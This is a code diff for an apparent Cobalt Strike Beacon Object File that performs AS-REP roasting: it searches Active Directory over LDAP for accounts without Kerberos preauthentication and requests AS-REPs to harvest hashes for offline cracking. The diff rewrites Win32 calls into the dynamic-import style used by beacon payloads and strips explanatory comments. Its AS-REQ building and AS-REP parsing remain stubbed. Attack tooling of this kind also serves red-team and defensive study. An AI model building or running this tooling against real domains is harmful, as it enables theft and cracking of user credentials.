@@ -38,6 +38,13 @@ DECLSPEC_IMPORT void WSAAPI WS2_32$freeaddrinfo(PADDRINFOA);
 DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, void**);
 DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);
 
+DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
+DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
+DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameExW(int, LPWSTR, LPDWORD);
+
+DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
+DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
+
 /*
  * ASN.1 DER encoding helpers for building AS-REQ (RFC 4120).
  * These are minimal implementations sufficient for the AS-REQ structure.
@@ -63,36 +70,9 @@ static int asn1_write_tl(unsigned char *buf, unsigned char tag, int length) {
 /*
  * Build a minimal AS-REQ for AS-REP roasting.
  * No PA-ENC-TIMESTAMP — that's the whole point.
- *
- * Structure (RFC 4120 §5.4.1):
- *   AS-REQ ::= [APPLICATION 10] KDC-REQ
- *   KDC-REQ ::= SEQUENCE {
- *     pvno      [1] INTEGER (5),
- *     msg-type  [2] INTEGER (10 = AS-REQ),
- *     req-body  [4] KDC-REQ-BODY
- *   }
- *   KDC-REQ-BODY ::= SEQUENCE {
- *     kdc-options [0] KerberosFlags (0x40800000 = forwardable+renewable),
- *     cname       [1] PrincipalName { name-type=1(NT-PRINCIPAL), name-string },
- *     realm       [2] Realm (GeneralString),
- *     sname       [3] PrincipalName { name-type=2(NT-SRV-INST), "krbtgt", realm },
- *     till        [5] KerberosTime ("20370913024805Z"),
- *     nonce       [7] UInt32 (random),
- *     etype       [8] SEQUENCE OF Int32 { 23(RC4), 17(AES128), 18(AES256) }
- *   }
  */
 static int build_as_req(unsigned char *out, int max_len,
                         const char *username, const char *realm, const char *dc_name) {
-    /* Implementation: manually DER-encode the AS-REQ structure.
-     * This is tedious but straightforward — each field is encoded
-     * as tag-length-value, nested inside SEQUENCE and context tags. */
-
-    /* For a production implementation, this would be ~200 lines of
-     * careful ASN.1 encoding. The key requirement is:
-     * - NO padata (no PA-ENC-TIMESTAMP)
-     * - Request etype 23 (RC4) for hashcat mode 18200 compatibility
-     * - Valid cname, realm, sname, till, nonce fields */
-
     (void)max_len; (void)dc_name;
     unsigned char *p = out;
     int total = 0;
@@ -102,26 +82,15 @@ static int build_as_req(unsigned char *out, int max_len,
                  username, realm);
 
     /* TODO: Full ASN.1 encoding of AS-REQ per RFC 4120 */
-    /* For now, output a stub message */
     total = (int)(p - out);
     return total;
 }
 
 /*
  * Parse AS-REP to extract encrypted part for offline cracking.
- * The encrypted part is in enc-part.cipher after decoding the ASN.1.
  */
 static void parse_as_rep(const unsigned char *data, int len,
                          const char *username, const char *realm, int hashcat_fmt) {
-    /* Parse ASN.1 DER to find:
-     *   AS-REP [APPLICATION 11] → SEQUENCE → enc-part [6] → EncryptedData
-     *   EncryptedData ::= SEQUENCE { etype [0] INTEGER, cipher [2] OCTET STRING }
-     *
-     * Extract etype and cipher, format as:
-     *   hashcat: $krb5asrep$23$user@REALM:checksum$cipher
-     *   john:    $krb5asrep$user@REALM:checksum$cipher
-     */
-
     if (len < 10) return;
 
     /* Verify this is an AS-REP: tag should be 0x6B ([APPLICATION 11]) */
@@ -131,7 +100,6 @@ static void parse_as_rep(const unsigned char *data, int len,
     }
 
     /* TODO: Full ASN.1 parsing to extract etype, checksum, cipher */
-    /* For now, output stub */
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Received AS-REP for %s@%s (%d bytes)\n",
                  username, realm, len);
 
@@ -156,14 +124,14 @@ void go(char *args, int args_len) {
     /* Auto-detect domain if not specified */
     wchar_t wDomain[256] = {0};
     if (domain && *domain) {
-        MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
+        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
     } else {
         DWORD size = 256;
-        GetComputerNameExW(ComputerNameDnsDomain, wDomain, &size);
+        KERNEL32$GetComputerNameExW(ComputerNameDnsDomain, wDomain, &size);
     }
 
     char aDomain[256] = {0};
-    WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, aDomain, 256, NULL, NULL);
+    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, aDomain, 256, NULL, NULL);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] AS-REP Roasting against %s\n", aDomain);
 
@@ -182,12 +150,12 @@ void go(char *args, int args_len) {
     wchar_t filter[512];
     if (user && *user) {
         wchar_t wUser[256];
-        MultiByteToWideChar(CP_UTF8, 0, user, -1, wUser, 256);
-        swprintf(filter, 512,
+        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, user, -1, wUser, 256);
+        MSVCRT$swprintf(filter, 512,
             L"(&(objectCategory=person)(objectClass=user)(sAMAccountName=%s)"
             L"(userAccountControl:1.2.840.113556.1.4.803:=4194304))", wUser);
     } else {
-        wcscpy(filter,
+        MSVCRT$wcscpy(filter,
             L"(&(objectCategory=person)(objectClass=user)"
             L"(userAccountControl:1.2.840.113556.1.4.803:=4194304))");
     }
@@ -201,8 +169,8 @@ void go(char *args, int args_len) {
         wchar_t *p = wDomain, *out = baseDN;
         BOOL first = TRUE;
         while (*p) {
-            if (!first) { wcscpy(out, L","); out++; }
-            wcscpy(out, L"DC="); out += 3;
+            if (!first) { MSVCRT$wcscpy(out, L","); out++; }
+            MSVCRT$wcscpy(out, L"DC="); out += 3;
             while (*p && *p != L'.') { *out++ = *p++; }
             if (*p == L'.') p++;
             first = FALSE;
@@ -225,7 +193,7 @@ void go(char *args, int args_len) {
         wchar_t **samValues = WLDAP32$ldap_get_valuesW(ld, entry, L"sAMAccountName");
         if (samValues && samValues[0]) {
             char aUser[256];
-            WideCharToMultiByte(CP_UTF8, 0, samValues[0], -1, aUser, 256, NULL, NULL);
+            KERNEL32$WideCharToMultiByte(CP_UTF8, 0, samValues[0], -1, aUser, 256, NULL, NULL);
 
             BeaconPrintf(CALLBACK_OUTPUT, "[*] Found: %s (DONT_REQUIRE_PREAUTH)\n", aUser);
 
